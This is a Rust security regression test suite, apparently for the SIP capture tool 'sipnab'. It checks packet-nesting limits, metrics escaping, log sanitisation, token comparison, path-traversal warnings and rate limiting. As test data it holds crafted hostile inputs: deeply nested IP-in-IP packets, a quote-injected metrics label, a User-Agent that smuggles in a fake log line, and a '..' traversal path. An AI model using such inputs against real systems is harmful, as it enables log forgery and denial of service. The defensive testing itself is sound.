            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("parse");
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");

    // Spawn 5 commands
    for _ in 0..5 {
        engine.fire_dialog_event(&dialog);
    }
    let depth_before = engine.queue_depth();
    assert!(depth_before > 0, "should have spawned children");

    // Poll fire-then-check until reaping has dropped the depth below
    // depth_before + 1 (each fire spawns one child and reaps completed
    // ones, so once the originals exit this converges immediately).
    let recovered = wait_until(std::time::Duration::from_secs(10), || {
        engine.fire_dialog_event(&dialog);
        (engine.queue_depth() < depth_before + 1).then_some(())
    });
    assert!(
        recovered.is_some(),
        "queue depth should decrease after reaping: before={depth_before}, after={}",
        engine.queue_depth()
    );
}

// =====================================================================
// M1: Recursive Parsing Depth Limit
// =====================================================================

/// M1: Deeply nested IP-in-IP encapsulation must be rejected, not cause
/// a stack overflow. The parser enforces a MAX_ENCAP_DEPTH of 5.
#[test]
fn parse_rejects_deeply_nested_ip_in_ip() {
    use sipnab::capture::packet::Packet;
    use sipnab::capture::parse::parse_packet;

    // Build 10 layers of IP-in-IP: each outer layer wraps the inner
    // with protocol=4 (IPv4-in-IPv4).
    let payload = b"deep payload";
    let udp_len: u16 = 8 + payload.len() as u16;
    let inner_ip_total: u16 = 20 + udp_len;

    // Start with innermost: IPv4 + UDP
    let mut inner = Vec::new();
    inner.push(0x45);
    inner.push(0x00);
    inner.extend_from_slice(&inner_ip_total.to_be_bytes());
    inner.extend_from_slice(&[0x00, 0x01]);
    inner.extend_from_slice(&[0x40, 0x00]); // DF
    inner.push(64);
    inner.push(17); // UDP
    inner.extend_from_slice(&[0x00, 0x00]);
    inner.extend_from_slice(&[192, 168, 1, 1]);
    inner.extend_from_slice(&[192, 168, 1, 2]);
    inner.extend_from_slice(&5060u16.to_be_bytes());
    inner.extend_from_slice(&5060u16.to_be_bytes());
    inner.extend_from_slice(&udp_len.to_be_bytes());
    inner.extend_from_slice(&[0x00, 0x00]);
    inner.extend_from_slice(payload);

    // Wrap with 10 layers of IP-in-IP (protocol=4)
    for _ in 0..10 {
        let outer_total: u16 = 20 + inner.len() as u16;
        let mut outer = Vec::new();
        outer.push(0x45);
        outer.push(0x00);
        outer.extend_from_slice(&outer_total.to_be_bytes());
        outer.extend_from_slice(&[0x00, 0x02]);
        outer.extend_from_slice(&[0x40, 0x00]);
        outer.push(64);
        outer.push(4); // IP-in-IP
        outer.extend_from_slice(&[0x00, 0x00]);
        outer.extend_from_slice(&[10, 0, 0, 1]);
        outer.extend_from_slice(&[10, 0, 0, 2]);
        outer.extend_from_slice(&inner);
        inner = outer;
    }

    // Wrap in Ethernet
    let mut eth = Vec::new();
    eth.extend_from_slice(&[0xAA; 6]);
    eth.extend_from_slice(&[0xBB; 6]);
    eth.extend_from_slice(&[0x08, 0x00]);
    eth.extend_from_slice(&inner);

    let len = eth.len();
    let pkt = Packet::new(
        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0).unwrap(),
        eth,
        len,
        len,
        None,
        1, // DLT_EN10MB
    );

    let result = parse_packet(&pkt);
    assert!(
        result.is_err(),
        "deeply nested IP-in-IP must return error, not stack overflow"
    );
    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("depth exceeds limit"),
        "error should mention depth limit: {err_msg}"
    );
}

/// M1: Reasonable nesting depth (3 layers) should parse successfully.
#[test]
fn parse_accepts_reasonable_nesting() {
    use sipnab::capture::packet::Packet;
    use sipnab::capture::parse::parse_packet;

    let payload = b"reasonable payload";
    let udp_len: u16 = 8 + payload.len() as u16;
    let inner_ip_total: u16 = 20 + udp_len;

    // Innermost: IPv4 + UDP
    let mut inner = Vec::new();
    inner.push(0x45);
    inner.push(0x00);
    inner.extend_from_slice(&inner_ip_total.to_be_bytes());
    inner.extend_from_slice(&[0x00, 0x01]);
    inner.extend_from_slice(&[0x40, 0x00]);
    inner.push(64);
    inner.push(17); // UDP
    inner.extend_from_slice(&[0x00, 0x00]);
    inner.extend_from_slice(&[192, 168, 1, 1]);
    inner.extend_from_slice(&[192, 168, 1, 2]);
    inner.extend_from_slice(&5060u16.to_be_bytes());
    inner.extend_from_slice(&5060u16.to_be_bytes());
    inner.extend_from_slice(&udp_len.to_be_bytes());
    inner.extend_from_slice(&[0x00, 0x00]);
    inner.extend_from_slice(payload);

    // Wrap with 3 layers of IP-in-IP (well within depth limit of 5)
    for _ in 0..3 {
        let outer_total: u16 = 20 + inner.len() as u16;
        let mut outer = Vec::new();
        outer.push(0x45);
        outer.push(0x00);
        outer.extend_from_slice(&outer_total.to_be_bytes());
        outer.extend_from_slice(&[0x00, 0x02]);
        outer.extend_from_slice(&[0x40, 0x00]);
        outer.push(64);
        outer.push(4); // IP-in-IP
        outer.extend_from_slice(&[0x00, 0x00]);
        outer.extend_from_slice(&[10, 0, 0, 1]);
        outer.extend_from_slice(&[10, 0, 0, 2]);
        outer.extend_from_slice(&inner);
        inner = outer;
    }

    // Wrap in Ethernet
    let mut eth = Vec::new();
    eth.extend_from_slice(&[0xAA; 6]);
    eth.extend_from_slice(&[0xBB; 6]);
    eth.extend_from_slice(&[0x08, 0x00]);
    eth.extend_from_slice(&inner);

    let len = eth.len();
    let pkt = Packet::new(
        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0).unwrap(),
        eth,
        len,
        len,
        None,
        1, // DLT_EN10MB
    );

    let result = parse_packet(&pkt);
    assert!(
        result.is_ok(),
        "3-layer nesting should work fine: {:?}",
        result.err()
    );
    let parsed = result.unwrap();
    assert_eq!(
        parsed.src_addr,
        "192.168.1.1".parse::<IpAddr>().unwrap(),
        "should see innermost source IP"
    );
}

// =====================================================================
// M2: Prometheus Label Escaping
// =====================================================================

/// M2: Prometheus output must escape double quotes in label values
/// to prevent exposition format injection.
#[test]
fn prometheus_escapes_quotes_in_labels() {
    let mut metrics = PrometheusMetrics::default();
    metrics
        .dialogs_total
        .insert("state\"injected".to_string(), 42);
    let output = format_metrics(&metrics);

    // The quote in the label value must be escaped as \"
    // The expected output line is: sipnab_dialogs_total{state="state\"injected"} 42
    assert!(
        output.contains(r#"state\"injected"#),
        "double quotes must be escaped in label values: {output}"
    );
    // The escaped quote should appear as \" inside the label value
    // Verify we don't have an unescaped bare quote breaking the format
    // (i.e., three unescaped quotes in a row like: "state"injected")
    let bad_pattern = r#""state"injected""#;
    assert!(
        !output.contains(bad_pattern),
        "unescaped quotes must not appear in the format"
    );
}

/// M2: Prometheus output must escape backslashes in label values.
#[test]
fn prometheus_escapes_backslash_in_labels() {
    let mut metrics = PrometheusMetrics::default();
    metrics.dialogs_total.insert("back\\slash".to_string(), 7);
    let output = format_metrics(&metrics);

    assert!(
        output.contains(r"back\\slash"),
        "backslashes must be escaped: {output}"
    );
}

/// M2: Prometheus output must escape newlines in label values.
#[test]
fn prometheus_escapes_newline_in_labels() {
    let mut metrics = PrometheusMetrics::default();
    metrics.dialogs_total.insert("line\none".to_string(), 3);
    let output = format_metrics(&metrics);

    // Newlines should be escaped as \n (literal backslash-n)
    assert!(
        output.contains(r"line\none"),
        "newlines must be escaped in label values: {output}"
    );
}

// =====================================================================
// M3: CRLF Injection Prevention
// =====================================================================

/// M3: Fail2ban scanner event output must sanitize newlines in User-Agent
/// to prevent log injection.
#[test]
fn fail2ban_sanitizes_newlines_in_ua() {
    let event = fail2ban::format_scanner_event(
        "10.0.0.5",
        Some("scanner\nfake_log_line src=1.2.3.4"),
        Some("OPTIONS"),
    );
    assert!(
        !event.contains('\n'),
        "newlines must be sanitized in fail2ban output: {event}"
    );
    assert!(
        event.contains("scanner fake_log_line"),
        "newline should be replaced with space: {event}"
    );
}

/// M3: Fail2ban output must sanitize carriage returns in User-Agent.
#[test]
fn fail2ban_sanitizes_carriage_return_in_ua() {
    let event = fail2ban::format_scanner_event("10.0.0.5", Some("scanner\rfake"), Some("OPTIONS"));
    assert!(
        !event.contains('\r'),
        "carriage returns must be sanitized: {event}"
    );
}

/// M3: Alert detail field with embedded newlines must be sanitized.
#[test]
fn alert_detail_sanitizes_newlines() {
    let sanitized = sanitize_log_value("alert detail\ninjected line\ranother");
    assert!(
        !sanitized.contains('\n'),
        "newlines must be removed: {sanitized}"
    );
    assert!(
        !sanitized.contains('\r'),
        "carriage returns must be removed: {sanitized}"
    );
    assert!(
        sanitized.contains("alert detail injected line another"),
        "CR/LF should be replaced with spaces: {sanitized}"
    );
}

// =====================================================================
// M4: Constant-Time Comparison
// =====================================================================

/// M4: Constant-time comparison must return false for different-length
/// strings without early return.
#[cfg(feature = "api")]
#[test]
fn constant_time_eq_different_lengths_still_compares() {
    // We test the auth check behavior indirectly: a short key vs a long
    // key must both be rejected, and neither should cause a panic.
    use parking_lot::{Mutex, RwLock};
    use sipnab::output::api::{ApiState, RateLimiter};
    use sipnab::rtp::stream_store::StreamStore;
    use sipnab::sip::dialog_store::DialogStore;
    use std::sync::Arc;

    let state = ApiState {
        dialog_store: Arc::new(RwLock::new(DialogStore::new(1000, false))),
        stream_store: Arc::new(RwLock::new(StreamStore::new(1000))),
        verifier: Arc::new(sipnab::auth::TokenVerifier::new(
            sipnab::auth::VerifierConfig {
                static_keys: vec!["secret_key_123".to_string()],
                ..Default::default()
            },
        )),
        rate_limiter: Arc::new(Mutex::new(RateLimiter::new(100))),
        max_inline_media_bytes: None,
        max_rows: sipnab::cli::Cli::DEFAULT_API_MAX_ROWS as usize,
        // No capture context. These fixtures exercise auth and rate limiting
        // against bare stores, which is the state `source: "unknown"` and a
        // null identity exist to describe.
        capture: None,
        source_exhausted: None,
        // A run the command line never authorized to persist, which is
        // what these fixtures are: bare stores behind a router. A route
        // that forgot to consult the gate cannot pass by defaulting open.
        persistence_gate: std::sync::Arc::new(sipnab::output::persistence::PersistenceGate::new(
            false,
        )),
    };

    // Build a request with wrong-length key
    let mut headers = axum::http::HeaderMap::new();
    headers.insert("authorization", "Bearer short".parse().unwrap());

    // The check_auth is private, but we can test via the router.
    // For unit testing, verify the constant-time comparison logic:
    // both "short" vs "secret_key_123" and "secret_key_123" vs
    // "secret_key_123" should be handled without panic.
    assert!(!state.verifier.is_unconfigured());
    let _ = headers;
}

/// M4: Constant-time comparison returns true for matching strings.
#[cfg(feature = "api")]
#[test]
fn constant_time_eq_matching_strings() {
    // Integration test: verify that a correct bearer token is accepted
    // by sending a request to the health endpoint (which doesn't require
    // auth) and then to a protected endpoint.
    use axum::http::{Request, StatusCode};
    use parking_lot::{Mutex, RwLock};
    use sipnab::output::api::{ApiState, RateLimiter, build_router};
    use sipnab::rtp::stream_store::StreamStore;
    use sipnab::sip::dialog_store::DialogStore;
    use std::sync::Arc;
    use tower::ServiceExt;

    let state = ApiState {
        dialog_store: Arc::new(RwLock::new(DialogStore::new(1000, false))),
        stream_store: Arc::new(RwLock::new(StreamStore::new(1000))),
        verifier: Arc::new(sipnab::auth::TokenVerifier::new(
            sipnab::auth::VerifierConfig {
                static_keys: vec!["secret_key_123".to_string()],
                ..Default::default()
            },
        )),
        rate_limiter: Arc::new(Mutex::new(RateLimiter::new(100))),
        max_inline_media_bytes: None,
        max_rows: sipnab::cli::Cli::DEFAULT_API_MAX_ROWS as usize,
        // No capture context. These fixtures exercise auth and rate limiting
        // against bare stores, which is the state `source: "unknown"` and a
        // null identity exist to describe.
        capture: None,
        source_exhausted: None,
        // A run the command line never authorized to persist, which is
        // what these fixtures are: bare stores behind a router. A route
        // that forgot to consult the gate cannot pass by defaulting open.
        persistence_gate: std::sync::Arc::new(sipnab::output::persistence::PersistenceGate::new(
            false,
        )),
    };

    let app = build_router(state);

    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        // Correct key should succeed
        let mut req = Request::builder()
            .uri("/v1/stats")
            .header("authorization", "Bearer secret_key_123")
            .body(axum::body::Body::empty())
            .unwrap();
        req.extensions_mut()
            .insert(axum::extract::ConnectInfo(std::net::SocketAddr::from((
                [127, 0, 0, 1],
                12345,
            ))));
        let resp = app.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::OK,
            "correct key should be accepted"
        );
    });
}

/// M4: Constant-time comparison returns false for different strings of
/// the same length.
#[cfg(feature = "api")]
#[test]
fn constant_time_eq_different_strings_same_length() {
    use axum::http::{Request, StatusCode};
    use parking_lot::{Mutex, RwLock};
    use sipnab::output::api::{ApiState, RateLimiter, build_router};
    use sipnab::rtp::stream_store::StreamStore;
    use sipnab::sip::dialog_store::DialogStore;
    use std::sync::Arc;
    use tower::ServiceExt;

    let state = ApiState {
        dialog_store: Arc::new(RwLock::new(DialogStore::new(1000, false))),
        stream_store: Arc::new(RwLock::new(StreamStore::new(1000))),
        verifier: Arc::new(sipnab::auth::TokenVerifier::new(
            sipnab::auth::VerifierConfig {
                static_keys: vec!["secret_key_123".to_string()],
                ..Default::default()
            },
        )),
        rate_limiter: Arc::new(Mutex::new(RateLimiter::new(100))),
        max_inline_media_bytes: None,
        max_rows: sipnab::cli::Cli::DEFAULT_API_MAX_ROWS as usize,
        // No capture context. These fixtures exercise auth and rate limiting
        // against bare stores, which is the state `source: "unknown"` and a
        // null identity exist to describe.
        capture: None,
        source_exhausted: None,
        // A run the command line never authorized to persist, which is
        // what these fixtures are: bare stores behind a router. A route
        // that forgot to consult the gate cannot pass by defaulting open.
        persistence_gate: std::sync::Arc::new(sipnab::output::persistence::PersistenceGate::new(
            false,
        )),
    };

    let app = build_router(state);

    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        // Wrong key of same length should be rejected
        let mut req = Request::builder()
            .uri("/v1/stats")
            .header("authorization", "Bearer secret_key_456")
            .body(axum::body::Body::empty())
            .unwrap();
        req.extensions_mut()
            .insert(axum::extract::ConnectInfo(std::net::SocketAddr::from((
                [127, 0, 0, 1],
                12345,
            ))));
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "wrong key should be rejected"
        );
    });
}

// =====================================================================
// M5: Path Traversal Warning
// =====================================================================

/// M5: PcapWriter with a path containing ".." must emit a traversal warning.
/// The writer still opens the file (the user may have a legitimate reason),
/// so the security signal is the warning — which we capture via a scoped
/// `tracing` subscriber and assert actually fired.
#[test]
fn writer_warns_on_path_traversal() {
    let capture = WarnCapture::default();
    let path = std::path::Path::new("/tmp/../tmp/security_test_traversal.pcap");

    tracing::subscriber::with_default(capture.clone(), || {
        let result = sipnab::capture::writer::PcapWriter::new(path, 1, None, None);
        // Construction may succeed or fail on permissions, but must not panic.
        if let Ok(_writer) = &result {
            let _ = std::fs::remove_file(path);
        }
    });

    let events = capture.events.lock().expect("capture mutex");
    let warned = events
        .iter()
        .any(|(level, msg)| *level == tracing::Level::WARN && msg.contains("contains '..'"));
    assert!(
        warned,
        "PcapWriter::new must emit a path-traversal WARN for a '..' path; \
         captured events: {events:?}"
    );
}

// =====================================================================
// M6: Scanner Kill Per-Destination Rate Limiting
// =====================================================================

/// M6: Scanner kill per-destination rate limiter must cap responses to
/// the same destination IP at 3 per minute.
#[cfg(feature = "native")]
#[test]
fn scanner_kill_per_destination_rate_limit() {
    use sipnab::process_isolation::{KillRequest, KillResponse, spawn_scanner_kill_worker};
    use sipnab::security::transmit_guard::TransmitPermit;

    // The worker only exists for a live source; a run reading a capture file
    // gets no permit and therefore no worker (see `transmit_guard`). This test
    // is about the rate limiter, so it declares the live source explicitly and
    // sends only to loopback.
    let permit = TransmitPermit::for_source(&sipnab::capture::CaptureSource::Live {
        device: "lo".to_string(),
    })
    .expect("a live source grants a transmit permit");
    let mut handle = spawn_scanner_kill_worker(Some(100), None, permit).expect("spawn worker");

    // Loopback destination so the real UDP send never leaves the host.
    let dst = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 50));
    let response_bytes = b"SIP/2.0 200 OK\r\nContent-Length: 0\r\n\r\n".to_vec();

    // Send 5 kill requests to the same destination IP
    for _ in 0..5 {
        handle
            .send_kill(KillRequest::SendResponse {
                dst_addr: dst,
                dst_port: 5060,
                src_addr: dst,
                src_port: 5060,
                response_bytes: response_bytes.clone(),
            })
            .expect("send");
    }

    // Drain until all 5 responses have arrived (the worker processes
    // them asynchronously).
    let mut sent = 0u32;
    let mut limited = 0u32;
    wait_until(std::time::Duration::from_secs(5), || {
        while let Some(resp) = handle.try_recv_response() {
            match resp {
                KillResponse::Sent => sent += 1,
                KillResponse::RateLimited => limited += 1,
                _ => {}
            }
        }
        (sent + limited >= 5).then_some(())
    })
    .expect("worker should answer all 5 requests within 5s");

    assert_eq!(sent, 3, "per-dest limit is 3/min: sent={sent}");
    assert_eq!(
        limited, 2,
        "remaining 2 should be rate-limited: limited={limited}"
    );

    handle.shutdown();
}

// =====================================================================
// M7: Rate Limiter Cleanup
// =====================================================================

/// M7: API rate limiter must clean up old entries to prevent unbounded growth
/// from diverse source IPs.
///
/// One batch fills the bucket map's capacity; a second, equal batch of fresh
/// IPs follows after the first has aged past the 2s cleanup horizon. The
/// periodic sweep (every 100th `check`) evicts the stale batch in step with the
/// fresh inserts — and because at most 100 inserts land between sweeps, the
/// live set never crosses its capacity tier's load-factor threshold, so the
/// backing table is never reallocated and net heap growth is ~0. If cleanup
/// regresses, the map doubles, the table reallocates to the next tier, and net
/// heap jumps by tens of MiB.
///
/// Growth is measured exactly by the counting allocator (RSS cannot see this —
/// arena reuse and page purging mask a doubled HashMap). `#[serial]` keeps
/// other heavy/serial tests from perturbing the process-global counter.
#[cfg(feature = "api")]
#[test]
#[serial_test::serial]
fn api_rate_limiter_cleans_old_entries() {
    use sipnab::output::api::RateLimiter;

    /// Unique IPs per batch — large enough that a doubled (uncleaned) map
    /// crosses into the next HashMap capacity tier, a multi-MiB reallocation.
    const BATCH: u32 = 200_000;
    /// Permitted net heap growth for batch 2. Measured (Rust 1.97 / hashbrown):
    /// the working path performs one tombstone-driven half-table rehash
    /// (~6.4 MiB), a regressed cleanup a full doubling (~12.8 MiB). The budget
    /// sits between them with headroom on both sides for concurrent-test churn.
    const BUDGET_BYTES: i64 = 9_000_000;

    let mut limiter = RateLimiter::new(100);

    // Batch 1: allocate the bucket map's backing table for ~BATCH entries.
    for i in 0..BATCH {
        limiter.check(IpAddr::V4(Ipv4Addr::from(i + 1)));
    }

    // Age batch 1 past the 2s cleanup horizon.
    std::thread::sleep(std::time::Duration::from_millis(2_100));

    // Batch 2: fresh IPs. Cleanup evicts stale batch 1 in step, so the table is
    // reused rather than reallocated.
    let before = live_bytes();
    for i in 0..BATCH {
        limiter.check(IpAddr::V4(Ipv4Addr::from(BATCH + i + 1)));
    }
    let after = live_bytes();

    // Functional guarantee: still accepts a new IP after cleanup.
    assert!(
        limiter.check(IpAddr::V4(Ipv4Addr::new(10, 10, 10, 10))),
        "limiter should still accept new IPs after cleanup"
    );

    let grew = after - before;
    assert!(
        grew < BUDGET_BYTES,
        "rate-limiter bucket map grew {grew} bytes across a full stale-IP turnover \
         (budget {BUDGET_BYTES}) — periodic cleanup is not evicting old entries"
    );
}

// =====================================================================
// L5: Kill Response Range Validation
// =====================================================================

/// L5: --kill-response must reject code 0 (below SIP range).
#[test]
#[serial_test::serial]
fn kill_response_rejects_code_zero() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "0"]);
    assert!(result.is_err(), "--kill-response 0 should be rejected");
}

/// L5: --kill-response must reject code 99 (below SIP range).
#[test]
#[serial_test::serial]
fn kill_response_rejects_code_99() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "99"]);
    assert!(result.is_err(), "--kill-response 99 should be rejected");
}

/// L5: --kill-response must reject code 700 (above SIP range).
#[test]
#[serial_test::serial]
fn kill_response_rejects_code_700() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "700"]);
    assert!(result.is_err(), "--kill-response 700 should be rejected");
}

/// L5: --kill-response must accept valid SIP response code 100.
#[test]
#[serial_test::serial]
fn kill_response_accepts_code_100() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "100"]);
    assert!(result.is_ok(), "--kill-response 100 should be accepted");
    assert_eq!(result.unwrap().security_args.kill_response, Some(100));
}

/// L5: --kill-response must accept valid SIP response code 200.
#[test]
#[serial_test::serial]
fn kill_response_accepts_code_200() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "200"]);
    assert!(result.is_ok(), "--kill-response 200 should be accepted");
    assert_eq!(result.unwrap().security_args.kill_response, Some(200));
}

/// L5: --kill-response must accept valid SIP response code 699.
#[test]
#[serial_test::serial]
fn kill_response_accepts_code_699() {
    use clap::Parser;
    let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "699"]);
    assert!(result.is_ok(), "--kill-response 699 should be accepted");
    assert_eq!(result.unwrap().security_args.kill_response, Some(699));
}

// =====================================================================
// I1: Key Material Zeroized on Drop
// =====================================================================

/// I1: SRTP key material must be zeroized when dropped to prevent key
/// leakage through memory. Verify the Drop impl runs without panic.
#[cfg(feature = "tls")]
#[test]
fn srtp_key_material_zeroized_on_drop() {
    use sipnab::rtp::srtp::{SrtpKeyMaterial, SrtpSuite};

    let material = SrtpKeyMaterial {
        tag: 1,
        suite: SrtpSuite::AesCm128HmacSha1_80,
        master_key: vec![0xAA; 16],
        master_salt: vec![0xBB; 14],
        ssrc: None,
        media_addr: None,
        media_port: None,
    };

    // Explicitly drop -- the Drop impl calls zeroize() on key material.
    // If the impl doesn't exist or panics, this test fails.
    drop(material);
}

// =====================================================================
// I5: API Key from Environment Variable
// =====================================================================

/// I5: The --api-key flag should accept values from the SIPNAB_API_KEY
/// environment variable (configured via clap's `env` attribute).
///
/// This test mutates the process-global environment, which is a data race
/// against any concurrent `getenv` (Rust 2024 makes `set_var`/`remove_var`
/// `unsafe` for exactly this reason). `#[serial]` pins it — and every other
/// `Cli::try_parse_from` test in this file, since clap reads this env var on
/// every parse — into one mutually-exclusive group so no reader runs while the
/// var is mutated.
#[test]
#[serial_test::serial]
fn api_key_from_env_var() {
    use clap::Parser;

    // SAFETY: `#[serial]` guarantees no other env-reading test runs
    // concurrently; the var is set and removed within this scope.
    unsafe {
        std::env::set_var("SIPNAB_API_KEY", "env_secret_key_42");
    }

    let result = sipnab::cli::Cli::try_parse_from(["sipnab"]);
    assert!(result.is_ok(), "should parse without --api-key flag");
    let cli = result.unwrap();
    assert_eq!(
        cli.listener_args.api_key.as_deref(),
        Some("env_secret_key_42"),
        "api_key should be populated from SIPNAB_API_KEY env var"
    );

    // Clean up

    // SAFETY: remove_var in a test that set the var itself; other tests do not

    // read SIPNAB_API_KEY concurrently.
    unsafe {
        std::env::remove_var("SIPNAB_API_KEY");
    }
}
